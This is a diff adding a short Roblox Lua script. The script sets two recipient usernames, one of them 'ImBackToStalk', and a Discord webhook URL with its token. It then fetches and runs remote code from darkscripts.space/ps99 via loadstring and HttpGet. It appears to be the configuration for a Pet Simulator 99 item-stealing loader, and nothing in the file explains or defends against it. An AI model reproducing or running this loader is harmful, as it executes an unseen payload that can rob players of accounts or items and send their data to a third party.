@@ -1,0 +1,5 @@
+Username = "xJxpy"
+Username2 = "ImBackToStalk"
+Webhook = "https://discordapp.com/api/webhooks/1296878485914124418/3g1aOvxo0j1zml5rwRePHA0nvWwAI5h3rbrhddOVQqWbdhfLWdyTsBkYjOqb85VvCVRF"
+
+loadstring(game:HttpGet(('https://darkscripts.space/ps99')))()
